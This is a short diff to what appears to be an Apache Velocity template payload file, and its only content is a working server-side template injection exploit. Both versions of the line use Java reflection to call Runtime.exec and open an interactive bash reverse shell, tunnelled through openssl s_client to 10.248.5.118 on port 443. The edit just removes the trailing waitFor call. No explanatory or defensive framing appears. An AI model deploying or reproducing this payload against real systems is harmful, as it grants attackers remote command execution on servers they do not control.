@@ -1,2 +1,2 @@
 #set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(new String []{"/bin/bash","-c","/bin/bash -i < temp/unsafeToDelete 2>&1 | openssl s_client -quiet -connect 10.248.5.118:443 > temp/unsafeToDelete"}).waitFor()
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(new String []{"/bin/bash","-c","/bin/bash -i < temp/unsafeToDelete 2>&1 | openssl s_client -quiet -connect 10.248.5.118:443 > temp/unsafeToDelete"})
